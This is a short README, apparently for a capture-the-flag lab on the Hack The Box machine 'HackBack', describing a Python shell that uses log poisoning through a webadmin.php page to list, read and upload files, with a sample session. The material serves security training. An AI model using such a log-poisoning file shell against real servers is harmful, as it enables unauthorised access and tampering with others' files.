## Challenge

[HackBack](https://www.hackthebox.eu/home/machines/profile/176) from Hackthebox.eu

## Reference

Originally published in blog posts:
 - https://0xdf.gitlab.io/2019/07/06/htb-hackback.html

## Log Poison File System Shell

### Description

Via access to the `webadminm.php` page, I could poison the logs such that I could get php file system dir/read/write. This shell enabled that.

### Usage

```
root@kali# ./hackback_filesystem.py 
hackback> help

Documented commands (type help <topic>):
========================================
dir  help  save  type  upload

hackback> help save
Save the contents of a file to a file
        Spaces in file path allowed
        save [relative path on hackback] [path to save to]
hackback> dir
Array
(
    [0] => .
    [1] => ..
    [2] => index.html
    [3] => webadmin.php
)
1
hackback> type index.html
<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="refresh" content="0; URL='/'" />
  </head>
  <body>
  </body>
</html>

hackback> upload site site.txt
hackback> dir
Array
(
    [0] => .
    [1] => ..
    [2] => index.html
    [3] => site.txt
    [4] => webadmin.php
)
1
hackback> type site.txt
twitter
paypal
facebook
hackthebox
```
